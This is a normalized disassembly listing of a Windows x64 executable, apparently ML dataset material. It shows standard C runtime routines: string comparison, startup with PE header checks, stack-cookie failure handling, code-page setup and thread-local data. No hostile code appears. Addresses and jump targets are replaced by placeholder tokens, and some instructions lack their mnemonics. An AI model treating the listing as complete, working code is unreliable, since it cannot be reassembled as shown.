xor ebx ebx
mov r10 rcx
cmp [ rw-data ] ebx
jne r-xdata
xor r9d r9d
call sub_140002484
cmp r8 rbx
je r-xdata
mov eax ebx
jmp r-xdata
cmp rcx rbx
jne r-xdata
add rsp 0x30
pop rbx
retn
cmp rdx rbx
je r-xdata
call sub_140003b30
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_140003a60
mov eax 0x7fffffff
jmp r-xdata
movzx ecx [ r10 ]
cmp cx 0x41
jb r-xdata
movzx eax [ rdx ]
cmp ax 0x41
jb r-xdata
cmp cx 0x5a
ja r-xdata
add r10 0x2
add rdx 0x2
sub r8 0x1
je r-xdata
cmp ax 0x5a
ja r-xdata
add cx 0x20
movzx eax ax
movzx ebx cx
sub ebx eax
cmp cx bx
je r-xdata
add ax 0x20
cmp cx ax
je r-xdata
sub_140002658
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
sub rsp 0x60
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_140003b30
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_140003a60
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
lea r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rsp + 0x38 ] 0x7fffffff
mov [ rsp + 0x48 ] 0x42
call sub_140003f60
sub [ rsp + 0x38 ] 0x1
mov ebx eax
js r-xdata
add rsp 0x60
pop rbx
retn
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_140003cb4
mov rcx [ rsp + 0x30 ]
mov [ rcx ] 0x0
jmp r-xdata
mov eax ebx
sub_1400026f4
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x30
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
xor ebx ebx
mov [ rsp + 0x40 ] ebx
movsxd rax [ r--data ]
lea rcx [ __dos_header ]
add rax rcx
cmp [ rax ] 0x4550
je r-xdata
call sub_1400038ac
test eax eax
jne r-xdata
cmp [ rw-data ] 0x2
je r-xdata
mov ecx 0x20b
cmp [ rax + 0x18 ] cx
je r-xdata
xor ebx ebx
mov [ rsp + 0x40 ] ebx
jmp r-xdata
call sub_140005bb4
nop
call sub_1400058c4
test eax eax
jns r-xdata
cmp [ rw-data ] 0x2
je r-xdata
mov ecx 0x1c
call sub_140004e8c
mov ecx 0xff
call sub_140004b10
call sub_1400050b4
cmp [ rax + 0x84 ] 0xe
ja r-xdata
xor ebx ebx
mov [ rsp + 0x40 ] ebx
jmp r-xdata
mov edi 0x1
mov ecx edi
call sub_140005c24
test eax eax
jne r-xdata
call GetCommandLineW
mov [ rw-data ] rax
call sub_140005830
mov [ rw-data ] rax
call sub_140005740
test eax eax
jns r-xdata
mov ecx 0x1b
call sub_140004aa4
mov ecx 0x10
call sub_140004e8c
mov ecx 0xff
call sub_140004b10
call sub_1400050b4
xor ebx ebx
cmp [ rax + 0xf8 ] ebx
setne bl
mov [ rsp + 0x40 ] ebx
jmp r-xdata
xor ebx ebx
mov [ rsp + 0x40 ] ebx
jmp r-xdata
call sub_140005470
test eax eax
jns r-xdata
mov ecx 0x8
call sub_140004aa4
mov ecx edi
call sub_140004bb0
test eax eax
je r-xdata
mov ecx 0x9
call sub_140004aa4
mov r8 [ rw-data ]
mov [ rw-data ] r8
mov rdx [ rw-data ]
mov ecx [ rw-data ]
call sub_140002220
mov edi eax
mov [ rsp + 0x20 ] eax
test ebx ebx
jne r-xdata
mov ecx eax
call sub_140004aa4
call sub_140004e04
jmp r-xdata
mov ecx eax
call sub_140004dec
mov eax edi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_140002866
mov edi eax
cmp [ rsp + 0x40 ] 0x0
jne r-xdata
call sub_140004e14
nop
mov eax edi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov ecx eax
call sub_140004df8
int3
sub_1400028a0
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov r11 [ rw-data ]
mov [ rsp + 0x58 ] r11
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_140005d24
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_140005d24
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_1400029ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8 rsi
xor edx edx
call sub_140005d40
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0x4 ] r11d
mov [ rbp + 0x8 ] r11d
mov [ rbp + 0xc ] r11d
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
sub rsi 0x1
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
sub rdx 0x1
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_140002a80
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x570 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rdx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rdx ] al
inc eax
inc rdx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rsp + 0x570 ]
xor rcx rsp
call sub_140002370
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x370 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_1400066f4
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_1400063f0
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x270 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_1400063f0
lea r11 [ rsp + 0x370 ]
lea rcx [ rsi + 0x1d ]
xor edx edx
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov rax r8
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_140005d40
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rsp + rdx + 0x170 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ rsp + rdx + 0x270 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
inc rdx
add r11 0x2
sub rbx 0x1
jne r-xdata
sub_140002c64
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_140003750
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_140006990
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_140006890
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_140004aa4
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ] 0x1
mov rbx [ rsp + 0x30 ]
[ rbx ] 0xffffffff
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_1400069d4
sub_140002d20
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1400023d8
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_140002db0
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_140002d20
xor ebx ebx
mov edi eax
cmp eax ebx
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_1400029ec
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_140005d40
lea rbp [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
add rbp rbp
mov r10d 0x4
lea r8 [ r13 + rbp * 8 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub r10 r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_140002370
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
cmp eax ebx
je r-xdata
movzx eax [ rdi ]
add rdi 0x2
mov [ rdx ] ax
add rdx 0x2
sub rcx r12
jne r-xdata
mov rcx rsi
call sub_140002a80
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
cmp eax ebx
je r-xdata
mov [ rsi + 0xc ] ebx
lea rdx [ rsi + 0x10 ]
lea rdi [ r13 + rbp * 8 + 0x4 ]
mov ecx 0x6
mov ebx 0x412
jmp r-xdata
cmp edi r12d
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_140005d40
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
cmp ecx r12d
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_140003028
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_140003750
mov rsi rax
call sub_140002c64
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_140002d20
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_140006a14
mov rbx rax
xor edi edi
cmp rax rdi
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_140006ba0
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_140002db0
mov r13d eax
cmp eax edi
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
[ rcx ] 0xffffffff
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
cmp rcx r12
je r-xdata
call sub_140003b30
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_1400069d4
test [ rw-data ] 0x1
jne r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ] 0x1
test [ rsi + 0xc8 ] 0x2
jne r-xdata
call sub_1400069d4
jmp r-xdata
mov ecx 0xd
call sub_140006990
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
mov [ rsp + 0x20 ] edx
lea r8 [ __dos_header ]
mov edx edi
mov [ rsp + 0x20 ] edx
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x903b8 ] ax
inc edx
mov [ rsp + 0x20 ] edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0xe240 ] al
inc edx
mov [ rsp + 0x20 ] edx
jmp r-xdata
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ] 0xffffffff
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0xe350 ] al
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ] 0x1
mov ecx 0xd
call sub_140006890
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
cmp edi 0x100
jge r-xdata
call sub_1400069d4
sub_140003248
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rax [ rcx + 0x128 ]
mov rbx rcx
test rax rax
je r-xdata
mov rax [ rbx + 0x130 ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
cmp rax rcx
je r-xdata
mov rcx [ rbx + 0x158 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
cmp [ rax ] 0x0
jne r-xdata
mov rax [ rbx + 0x110 ]
test rax rax
je r-xdata
lea rdi [ rbx + 0x58 ]
mov esi 0x6
cmp [ rcx + 0x160 ] 0x0
jne r-xdata
mov rcx [ rbx + 0x138 ]
sub rcx 0xfe
call sub_1400069d4
mov rcx [ rbx + 0x148 ]
mov edi 0x80
sub rcx rdi
call sub_1400069d4
mov rcx [ rbx + 0x150 ]
sub rcx rdi
call sub_1400069d4
mov rcx [ rbx + 0x130 ]
call sub_1400069d4
cmp [ rax ] 0x0
jne r-xdata
cmp [ rdi - 0x8 ] 0x0
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
call sub_140006ed4
mov rcx [ rbx + 0x158 ]
call sub_1400069d4
mov rcx [ rbx + 0x120 ]
test rcx rcx
je r-xdata
add rdi 0x20
sub rsi 0x1
jne r-xdata
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x118 ]
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp [ rdi - 0x10 ] rax
je r-xdata
mov rcx rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_1400069d4
cmp [ rcx ] 0x0
jne r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x110 ]
call sub_1400069d4
mov rcx [ rbx + 0x128 ]
call sub_1400069d4
cmp [ rcx ] 0x0
jne r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x128 ]
call sub_140007108
call sub_1400069d4
call sub_1400069d4
mov rcx [ rbx + 0x128 ]
call sub_1400070c0
sub_1400033c4
[ rcx ] 0x1
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] 0x1
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] 0x1
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] 0x1
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] 0x1
retn
[ rdx ] 0x1
sub_14000345c
test rcx rcx
je r-xdata
mov rax rcx
retn
or r9d 0xffffffff
[ rcx ] r9d
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] r9d
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] r9d
lea rax [ rcx + 0x58 ]
mov r8d 0x6
[ rax ] r9d
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] r9d
lea rdx [ rw-data ]
cmp [ rax - 0x10 ] rdx
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] r9d
[ rdx ] r9d
sub_140003504
push rbx
sub rsp 0x20
mov rbx rdx
test rdx rdx
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
jmp r-xdata
mov [ rcx ] rdx
mov rcx rdx
call sub_1400033c4
test r10 r10
je r-xdata
add rsp 0x20
pop rbx
retn
mov rcx r10
call sub_14000345c
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_140003248
sub_14000355c
push rbx
sub rsp 0x20
call sub_140003750
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_140006990
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_140003504
mov rbx rax
mov ecx 0xc
call sub_140006890
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_140004aa4
call sub_140003750
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_140003618
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_140006990
nop
mov rax [ rbx + 0xb8 ]
[ rax ] 0x1
mov ecx 0xd
call sub_140006890
mov ecx 0xc
call sub_140006990
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_1400033c4
nop
mov ecx 0xc
call sub_140006890
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_1400036cc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_140006a80
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_1400069d4
xor ebx ebx
xor edx edx
call sub_140003618
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_140003774
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_1400069d4
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_1400069d4
mov ecx 0xd
call sub_140006990
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_1400069d4
mov ecx 0xd
call sub_140006890
mov ecx 0xc
call sub_140006990
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ] 0xffffffff
jne r-xdata
mov ecx 0xc
call sub_140006890
mov rcx rbx
call sub_1400069d4
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_14000345c
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_1400069d4
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_140003248
nop
sub_1400038ac
push rbx
sub rsp 0x20
call sub_140004e24
call sub_140006780
test eax eax
je r-xdata
call sub_1400035f0
xor eax eax
lea rcx [ sub_140003774 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_140006a80
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_140003618
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140003938
push rbx
sub rsp 0x5e0
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_140005d40
lea r11 [ rsp + 0x70 ]
lea rax [ rsp + 0x110 ]
lea rcx [ rsp + 0x110 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov rbx [ rsp + 0x208 ]
lea rdx [ rsp + 0x40 ]
mov rcx rbx
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
mov rax [ rsp + 0x5e8 ]
mov [ rsp + 0x208 ] rax
lea rax [ rsp + 0x5e8 ]
mov [ rsp + 0x1a8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rsp + 0x110 ]
mov r8 rbx
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000417
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x5e0
pop rbx
retn
test ebx ebx
jne r-xdata
mov rax [ rsp + 0x5e8 ]
mov [ rsp + 0x70 ] 0xc0000417
mov [ rsp + 0x74 ] 0x1
mov [ rsp + 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x2 ]
call sub_140005d24
sub_140003a60
mov [ rsp + 0x8 ] rbx
